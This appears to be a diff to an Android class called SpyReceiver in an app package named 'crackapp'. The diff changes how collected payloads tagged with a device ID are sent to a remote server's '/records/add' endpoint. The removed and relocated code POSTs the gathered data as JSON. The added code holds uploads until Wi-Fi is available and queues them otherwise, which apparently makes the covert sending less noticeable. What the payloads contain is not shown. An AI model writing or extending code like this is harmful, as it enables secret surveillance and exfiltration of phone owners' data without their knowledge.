@@ -4,6 +4,8 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.os.Handler;
 import android.provider.Settings;
 import android.util.Log;
@@ -12,8 +14,12 @@ import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
 import com.loopj.android.http.AsyncHttpClient;
 
+import java.util.LinkedList;
+import java.util.Queue;
+
 import co.poweramp.crackapp.Constants;
 import co.poweramp.crackapp.R;
+import co.poweramp.crackapp.Util;
 import cz.msebera.android.httpclient.Header;
 import cz.msebera.android.httpclient.entity.StringEntity;
 
@@ -40,54 +46,45 @@ public class SpyReceiver extends BroadcastReceiver {
         }
         final Handler handler = new Handler();
         Log.d(TAG, "Doing job");
-        new Job(context, new Job.JobListener() {
+        new Job(context, new Job.JobCompletionListener() {
             @Override
-            public void onComplete(final Payload p) {
-                handler.post(new Runnable() {
-                    @Override
-                    public void run() {
-                        p.setAccountId(accountId);
-                        submitPayload(context, p);
-                    }
-                });
+            public void onComplete(Job j, Payload p) {
+                ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+                NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
+                if (mWifi.isConnected()) {
+                    //Wi-Fi available, start upload
+                    j.upload(new Job.UploadCompletionListener() {
+                        @Override
+                        public void onSuccess(final Payload p) {
+                            handler.post(new Runnable() {
+                                @Override
+                                public void run() {
+                                    p.setAccountId(accountId);
+                                    Util.submitPayload(context, p);
+                                }
+                            });
+                        }
+
+                        @Override
+                        public void onFailure() {
+                            Log.d(TAG, "Job upload failure");
+                        }
+                    });
+                } else {
+                    //Wi-Fi unavailable, queue for later upload
+                    UploadCheckReceiver.jobQueue.add(j);
+                    Log.d(TAG, "Job sent to queue, awaiting upload later.");
+                }
+            }
+
+            @Override
+            public void onFailure(Job j) {
+                Log.d(TAG, "Job completion failure");
             }
         });
+
+
     }
-
-    /**
-     * Submit a payload
-     * @param context
-     * @param p
-     */
-    private void submitPayload(Context context, Payload p) {
-        final Gson gson = new GsonBuilder().registerTypeAdapter(Payload.class, new PayloadSerialiser()).setPrettyPrinting().create();
-        String json = gson.toJson(p);
-        StringEntity entity;
-        try {
-            entity = new StringEntity(json);
-        } catch (Exception e) {
-            e.printStackTrace();
-            return;
-        }
-        Log.d(TAG, "Sending JSON: " + json);
-        httpClient.post(context, Constants.BASE_URL + "/records/add", entity, "application/json", new SaneAsyncHttpResponseHandler() {
-            @Override
-            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                Log.d(TAG, "Sent payload to server successfully.");
-                String resp = new String(responseBody);
-                Log.d(TAG, "Server response: " + resp);
-            }
-
-            @Override
-            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                Log.d(TAG, "Failed to send payload to server: " + statusCode);
-                String resp = new String(responseBody);
-                Log.d(TAG, "Server response: " + resp);
-            }
-        });
-    }
-
-
 
     private String getUniqueDeviceId(final Context context) {
         return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
